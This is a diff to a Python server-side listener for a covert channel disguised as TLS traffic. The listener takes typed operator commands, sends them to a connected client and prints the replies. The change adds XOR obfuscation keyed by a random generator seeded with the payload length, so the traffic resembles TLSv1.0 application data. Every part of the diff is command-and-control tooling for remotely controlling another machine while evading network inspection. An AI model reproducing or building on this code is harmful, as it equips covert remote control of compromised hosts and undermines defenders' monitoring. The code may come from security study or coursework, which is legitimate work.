@@ -5,7 +5,7 @@
 # @brief this file contains packets for the TLS covert channel
 #           intended to run on the server side. 
 
-
+import random
 import socket
 import argparse
 import time
@@ -18,25 +18,36 @@ def encodePacket(data):
 
     @return  A byte array containing the full packet to send.
     """
-    ##The standard TLSv1.0 header
     tlsHeader = bytes([0x17,0x03,0x01])
     length = len(data)
+    random.seed(length)
+    temp = []
+    for d in data:
+        rand = random.randrange(256)
+        temp.append(d ^ rand)
+    data = bytearray(temp)
     toSend = tlsHeader + length.to_bytes(2, 'big') + data
     return toSend
 
-def recievePacket(sock):
+def receivePacket(sock):
     """! This function receives a packet from the client.
 
     @param sock  The socket descriptor to read from.
 
     @return  The raw data recieved from the client, sans header.
     """
-    ##The array of data received - TODO, why is this here?
     data = bytearray() 
-    ##The TLS header received
     headIn = sock.recv(5)
+    
     lenfromhead = int.from_bytes(headIn[3:], "big")
-    return sock.recv(lenfromhead)
+    data = sock.recv(lenfromhead)
+    random.seed(lenfromhead)
+    temp = []
+    for d in data:
+        rand = random.randrange(256)
+        temp.append(d ^ rand)
+    data = bytearray(temp)
+    return data
 
 
 def run(port):
@@ -57,7 +68,7 @@ def run(port):
         print("Connected to : {}".format(addr))
         print("Type 'exit' to disconnect.")
         #Recieve initiallization
-        recievePacket(sock) #TODO - does this mean it could be any packet?
+        receivePacket(sock) 
         while True:
             ##The command the user types
             command = input(">")
@@ -77,11 +88,11 @@ def run(port):
                     sock.close()
                     print(f"Lost connection to {addr}")
                     break
-            response = recievePacket(sock)
+            response = receivePacket(sock)
             print(response.decode("utf-8"))
 
 ##
-#TODO - what does this do? 
+# Sets this file up to be run by the command line. 
 #
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Program to provide TLS covert channel listiner.',
